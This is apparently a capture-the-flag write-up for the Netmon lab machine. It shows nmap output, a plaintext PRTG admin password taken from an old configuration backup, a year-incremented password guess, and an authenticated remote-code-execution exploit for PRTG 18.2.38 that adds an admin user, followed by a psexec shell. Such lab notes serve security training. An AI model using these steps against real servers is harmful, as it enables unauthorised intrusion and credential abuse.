> nmap -sC -sV -A 10.10.10.152
PORT    STATE SERVICE      VERSION
21/tcp  open  ftp          Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_10-26-23  04:37AM       <DIR>          Windows
80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows


/ProgramData/Paessler/PRTG Network Monitor
->PRTG Configuration.old.bak
<dbpassword>
    <!-- User: prtgadmin -->
    PrTg@dmin2018
</dbpassword>

able to login using prtgadmin:PrTg@dmin2019 (based on the date of PRTG Configuration.old)

found the the system that been using are PRTG Network Monitor 18.2.38
-> https://www.exploit-db.com/exploits/46527 (PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution)

make ./netmon-exploit.sh script then execute (based on the cve documentation)
-> ./netmon-exploit.sh -u http://10.10.10.152 -c "_ga=GA1.4.1968957364.1698310034; _gid=GA1.4.2021176661.1698310034; OCTOPUS1813713946=ezMxMDJBRDY4LTg0MTgtNDIzRi05RDU1LTE5MkE1RjE4QTg3Q30%3D"
The cookies that been used (_ga, _gid, and OCTOPUS1813713946) found using cookie-editor extension on firefox or can also use inspect element on the browser

The script will make a new user with credentials -> pentest:P3nT3st!

After the new user successfuly created, using impacket, execute
> python3 psexec.py pentest@10.10.10.152